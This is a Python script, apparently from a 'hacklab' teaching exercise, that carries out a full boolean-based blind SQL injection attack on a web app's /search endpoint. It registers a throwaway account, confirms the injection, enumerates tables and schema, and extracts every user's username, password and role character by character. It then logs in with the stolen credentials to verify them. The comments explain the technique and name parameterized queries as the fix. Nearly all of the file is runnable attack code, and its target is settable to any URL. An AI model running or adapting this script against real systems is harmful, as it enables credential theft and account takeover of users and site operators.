#!/usr/bin/env python3
"""
SQL Injection -- Blind (Boolean-based) Attack
==============================================

this is the second type of SQL injection in the hacklab
unlike the classic attack where UNION SELECT results appear on the page,
blind injection works when the attacker can NOT see database output directly

the only signal we get is whether the search returned results or not
so we ask the database yes/no questions one character at a time:
  "is the 1st char of admin's password 'a'?"  -> results appear = YES
  "is the 1st char of admin's password 'b'?"  -> no results     = NO

this is much slower than classic SQLi (one HTTP request per character per guess)
but it works even when the app hides all database output

the math: 73 charset chars x ~8 char password x ~3 users = ~1752 requests minimum
real-world attackers optimize this with binary search (halving the charset each time)

targets the same /search endpoint as sqli_classic.py
the fix is also the same -- parameterized queries prevent ALL types of SQLi

usage:
    python3 scripts/sqli_blind.py
    python3 scripts/sqli_blind.py --target http://127.0.0.1:5000
"""

import argparse
import re
import sys
import time
import string

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"
ATTACKER_USER = "blind_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "blind_probe_2026"

# the character set we test against for each position in the extracted string
# lowercase first because most passwords and usernames start lowercase
# then digits, then uppercase, then special characters
# a smarter version would use frequency analysis to order by likelihood
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*_-."


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"
    M = "\033[95m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")

def is_login_page(text):
    return "<title>Login</title>" in text and 'name="username"' in text


def get_result_count(session, target, payload):
    """sends a search query and returns how many results the page shows
    we parse the 'Found <strong>N</strong>' text from the HTML
    if we got redirected to the login page, returns -1"""
    resp = session.get(f"{target}/search", params={"q": payload}, timeout=10)
    if is_login_page(resp.text):
        return -1
    m = re.search(r'Found <strong[^>]*>(\d+)</strong>', resp.text)
    return int(m.group(1)) if m else 0


def blind_test(session, target, condition):
    """injects a boolean condition into the search query and checks the result

    the payload structure: ' AND 1=0 OR ({condition}) --
    
    the AND 1=0 kills the original search results so only our condition matters
    if our condition is TRUE, the OR clause matches and we see results
    if our condition is FALSE, nothing matches and result count is 0
    
    this gives us a clean yes/no signal regardless of what notes exist"""
    payload = f"' AND 1=0 OR ({condition}) --"
    count = get_result_count(session, target, payload)
    return count > 0


# ──────────────────────────────────────────────
# phase 0 -- authenticate
# same as every other script -- register throwaway account to access /search
# ──────────────────────────────────────────────

def phase0_auth(session, target):
    banner("PHASE 0 -- Authenticate")
    info(f"Creating throwaway account: '{ATTACKER_USER}'")

    try:
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        if is_login_page(resp.text):
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True
    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 1 -- confirm blind injection works
# we need to verify that TRUE and FALSE conditions produce different results
# if they both return 0, the injection point doesn't exist or doesn't work
# ──────────────────────────────────────────────

def phase1_confirm(session, target):
    banner("PHASE 1 -- Confirm Blind Injection")
    info("Testing if we can distinguish TRUE vs FALSE conditions...\n")

    # a condition that is always TRUE should return results
    true_count = get_result_count(session, target, "' OR 1=1 --")
    info(f"  Payload: ' OR 1=1 --  ->  {C.G}{true_count} results{C.X}")

    # a condition that is always FALSE should return no results
    false_count = get_result_count(session, target, "' AND 1=2 --")
    info(f"  Payload: ' AND 1=2 --  ->  {C.R}{false_count} results{C.X}")

    # if we can tell them apart, blind injection is possible
    if true_count > false_count:
        ok(f"Blind injection confirmed! TRUE={true_count}, FALSE={false_count}")
        ok("We can ask yes/no questions to the database.")
        return True
    else:
        fail("Cannot distinguish TRUE vs FALSE -- blind injection won't work")
        return False


# ──────────────────────────────────────────────
# character-by-character extraction engine
#
# this is the core of blind SQLi -- we extract data one character at a time
# for each position, we test every character in CHARSET until we find a match
#
# SUBSTR(expr, pos, 1) returns one character at the given position
# we compare it with ='a', ='b', ='c', etc until it matches
#
# worst case: 73 characters * N positions = 73N requests per string
# a binary search optimization could cut this to ~6N but this version
# is simpler and easier to understand for educational purposes
# ──────────────────────────────────────────────

def extract_string_blind(session, target, sql_expr, max_len=50, label=""):
    """extracts a string value from the database character by character
    
    sql_expr should be a SQL subquery that returns a single string, like:
        SELECT password FROM users WHERE username='admin'
    
    for each position (1, 2, 3, ...) we test every character in CHARSET
    when we find a match, we add it to the result and move to the next position
    when no character matches, we know we've reached the end of the string"""
    result = ""
    
    for pos in range(1, max_len + 1):
        found = False
        
        for ch in CHARSET:
            # ask: "is the character at position {pos} equal to '{ch}'?"
            condition = f"SUBSTR(({sql_expr}),{pos},1)='{ch}'"
            if blind_test(session, target, condition):
                result += ch
                found = True
                # show progress in real-time so the user can see the string being built
                # the _ at the end indicates "still extracting"
                sys.stdout.write(f"\r  {C.CN}[*]{C.X} {label}: {C.Y}{result}{C.X}{C.D}_{C.X}  ")
                sys.stdout.flush()
                break
        
        if not found:
            # no character matched at this position -- the string has ended
            break
    
    # overwrite the progress line with the final result
    sys.stdout.write(f"\r  {C.G}[+]{C.X} {label}: {C.Y}{result}{C.X}    \n")
    sys.stdout.flush()
    return result


# ──────────────────────────────────────────────
# phase 2 -- find table names
# we query sqlite_master to discover which tables exist
# first we find the count, then extract each name
# ──────────────────────────────────────────────

def phase2_find_tables(session, target):
    banner("PHASE 2 -- Enumerate Tables (Blind)")
    info("Extracting table names character by character...")
    info("Each character requires testing ~60 possibilities.\n")

    tables = []
    
    # first find how many tables exist by testing count=1, count=2, etc
    for n in range(1, 20):
        condition = f"(SELECT COUNT(*) FROM sqlite_master WHERE type='table')={n}"
        if blind_test(session, target, condition):
            ok(f"Database has {C.Y}{n}{C.X} table(s)\n")
            break

    # now extract each table name using LIMIT/OFFSET
    for i in range(n):
        sql = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}"
        name = extract_string_blind(session, target, sql, label=f"Table {i+1}")
        if name:
            tables.append(name)

    print()
    ok(f"Tables found: {C.Y}{', '.join(tables)}{C.X}")
    return tables


# ──────────────────────────────────────────────
# phase 3 -- find column names of the users table
# we extract the CREATE TABLE statement from sqlite_master
# and parse column names from it
# ──────────────────────────────────────────────

def phase3_find_columns(session, target):
    banner("PHASE 3 -- Enumerate 'users' Table Columns (Blind)")
    info("Extracting CREATE TABLE statement to find column names...\n")

    # sqlite_master stores the full CREATE TABLE sql for each table
    # we extract it character by character
    sql = "SELECT sql FROM sqlite_master WHERE type='table' AND name='users'"
    create_sql = extract_string_blind(session, target, sql, max_len=200, label="Schema")

    if create_sql:
        # parse column names from patterns like "username VARCHAR(80)"
        cols = re.findall(r'(\w+)\s+(?:INTEGER|VARCHAR|TEXT|DATETIME|BOOLEAN)', create_sql, re.IGNORECASE)
        ok(f"Columns: {C.Y}{', '.join(cols)}{C.X}")
        
        # highlight the password column because it is the target
        if 'password' in cols:
            warn(f"{C.R}Found 'password' column -- passwords may be in plaintext!{C.X}")
        
        return cols
    
    return []


# ──────────────────────────────────────────────
# phase 4 -- extract credentials
# the slowest part -- we extract username, password, and role for each user
# each field requires character-by-character extraction
# ──────────────────────────────────────────────

def phase4_dump_users(session, target):
    banner("PHASE 4 -- Extract Credentials (Blind)")

    # find how many users exist
    user_count = 0
    for n in range(1, 50):
        condition = f"(SELECT COUNT(*) FROM users)={n}"
        if blind_test(session, target, condition):
            user_count = n
            break
    
    ok(f"Found {C.Y}{user_count}{C.X} user(s) in database\n")
    info("Extracting each username and password character by character...")
    info(f"This is slow by design -- each char needs ~{len(CHARSET)} requests.\n")

    credentials = []
    
    for i in range(user_count):
        # extract the username first
        sql_user = f"SELECT username FROM users LIMIT 1 OFFSET {i}"
        username = extract_string_blind(session, target, sql_user, label=f"User {i+1} name")

        # then use the username to query its password
        sql_pass = f"SELECT password FROM users WHERE username='{username}'"
        password = extract_string_blind(session, target, sql_pass, label=f"User {i+1} pass")

        # and the role (admin/user)
        sql_role = f"SELECT role FROM users WHERE username='{username}'"
        role = extract_string_blind(session, target, sql_role, max_len=10, label=f"User {i+1} role")

        credentials.append((username, password, role))
        print()

    # print a summary table of all extracted credentials
    if credentials:
        print(f"\n  {C.B}{'USERNAME':<20}{'PASSWORD':<25}{'ROLE':<10}{C.X}")
        print(f"  {'─' * 55}")
        for username, password, role in credentials:
            role_color = C.R if role == 'admin' else C.D
            print(f"  {C.Y}{username:<20}{C.X}{C.R}{password:<25}{C.X}{role_color}{role:<10}{C.X}")
    
    return credentials


# ──────────────────────────────────────────────
# phase 5 -- verify stolen credentials
# ──────────────────────────────────────────────

def phase5_verify(target, credentials):
    banner("PHASE 5 -- Verify Stolen Credentials")

    verified = 0
    for username, password, role in credentials:
        s = requests.Session()
        resp = s.post(f"{target}/login", data={
            "username": username, "password": password,
        }, allow_redirects=False, timeout=5)

        if resp.status_code == 302:
            ok(f"{C.G}VERIFIED{C.X}  {C.Y}{username}{C.X}:{C.R}{password}{C.X}")
            verified += 1
            try: s.get(f"{target}/logout", timeout=3)
            except: pass
        else:
            fail(f"FAILED   {username}:{password}")

    print(f"\n  {verified}/{len(credentials)} credentials verified")
    return verified


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary(total_requests, elapsed, cred_count):
    banner("ATTACK SUMMARY -- Blind SQL Injection")
    print(f"""
  {C.B}Key difference from Classic:{C.X}

    Classic:  ' UNION SELECT username,password FROM users --
              -> credentials appear directly on the page

    Blind:    ' AND SUBSTR((SELECT password FROM users ...),1,1)='a' --
              -> only "results found" vs "no results" is visible
              -> data extracted 1 character at a time

  {C.B}Statistics:{C.X}
    Total HTTP requests:  ~{total_requests}
    Time elapsed:         {elapsed:.1f} seconds
    Credentials found:    {cred_count}
    Charset tested:       {len(CHARSET)} chars/position

  {C.Y}Why blind injection matters:{C.X}
    Even if the app hides UNION results or only shows counts,
    as long as the SQL query is injectable, data can be extracted.
    It's slower but just as devastating.

  {C.Y}Fix:{C.X}
    Same as classic -- parameterized queries prevent ALL types of SQLi:
    db.session.execute(text("... WHERE title LIKE :q"), {{"q": f"%{{q}}%"}})
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SQL Injection -- Blind (Boolean-based)")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.M}
  ██████╗ ██╗     ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗██║██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝ 
{C.X}
  {C.D}Boolean-based Blind SQL Injection{C.X}
  {C.D}Target: {target}{C.X}
  {C.D}Charset: {len(CHARSET)} characters per position{C.X}
""")

    session = requests.Session()
    start_time = time.time()

    # we wrap session.get and session.post to count total HTTP requests
    # this lets us show how many requests the entire attack took
    # which helps understand why blind SQLi is slow compared to classic
    request_counter = [0]  # list so the inner function can mutate it

    original_get = session.get
    def counting_get(*a, **kw):
        request_counter[0] += 1
        return original_get(*a, **kw)
    session.get = counting_get

    original_post = session.post
    def counting_post(*a, **kw):
        request_counter[0] += 1
        return original_post(*a, **kw)
    session.post = counting_post

    if not phase0_auth(session, target):
        sys.exit(1)

    if not phase1_confirm(session, target):
        sys.exit(1)

    tables = phase2_find_tables(session, target)

    if 'users' in tables:
        phase3_find_columns(session, target)
    else:
        warn("'users' table not found -- skipping column enumeration")

    credentials = phase4_dump_users(session, target)

    if credentials:
        phase5_verify(target, credentials)

    elapsed = time.time() - start_time
    print_summary(request_counter[0], elapsed, len(credentials))


if __name__ == "__main__":
    main()
